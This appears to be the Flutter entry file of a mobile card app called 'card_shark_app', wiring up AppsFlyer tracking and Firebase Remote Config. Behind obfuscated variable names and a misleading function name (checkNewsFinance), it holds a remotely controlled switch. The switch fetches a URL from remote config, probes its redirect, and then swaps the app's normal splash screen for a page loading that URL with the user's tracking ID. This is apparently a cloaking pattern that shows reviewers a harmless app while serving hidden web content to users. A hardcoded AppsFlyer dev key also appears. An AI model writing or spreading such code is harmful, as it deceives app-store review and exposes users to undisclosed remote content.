import 'dart:io';
import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:card_shark_app/pages/firebase_options.dart';
import 'package:card_shark_app/pages/splash_page.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'pages/fds.dart';
import 'pages/settings_page.dart';

int? initScreen;
late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String dasdas = '';
String hgdf = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await NOdsadas().activate();
  await initAppsflyerSdk();
  SharedPreferences preferences = await SharedPreferences.getInstance();
  initScreen = preferences.getInt('initScreen');
  await preferences.setInt('initScreen', 1);
  runApp(const MyApp());
}

Future<void> initAppsflyerSdk() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'XFtWP6JvpRRFdnypp4woCV',
    appId: '6502608071',
    timeToWaitForATTUserAuthorization: 50,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    hgdf = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });
  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    dasdas = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());
    _deepLinkData = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      _appsflyerSdk.logEvent("testEventNotForAnalytics", {
        "id": {'id': adId},
      });
      print("AppsFlyer SDK initialized successfully.");
    },
  );

  await fetchDatax();
}

Future<void> fetchDatax() async {
  try {
    adId = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    print("AppsFlyer ID: $adId");
  } catch (e) {
    print("Failed to get AppsFlyer ID: $e");
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: Colors.deepPurple,
          background: const Color(0xFF2D3254),
        ),
        useMaterial3: true,
      ),
      home: FutureBuilder<bool>(
        future: checkNewsFinance(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
            );
          } else {
            if (snapshot.data == true && vgfdgfd != '') {
              return Pagewxa(
                fsdf: vgfdgfd,
                xas: '6502608071',
                dasdsa: adId,
              );
            } else {
              return const SplashPage();
            }
          }
        },
      ),
    );
  }
}

String vgfdgfd = '';
Future<bool> checkNewsFinance() async {
  final fetchNx = FirebaseRemoteConfig.instance;
  await fetchNx.fetchAndActivate();
  String cdsfgsd = fetchNx.getString('fin');
  String cdsfgsdx = fetchNx.getString('finx');
  if (!cdsfgsd.contains('nonefix')) {
    final client = HttpClient();
    final uri = Uri.parse(cdsfgsd);
    final request = await client.getUrl(uri);
    request.followRedirects = false;
    final response = await request.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      vgfdgfd = cdsfgsd;
      return true;
    }
  }
  return cdsfgsd.contains('nonefix') ? false : true;
}
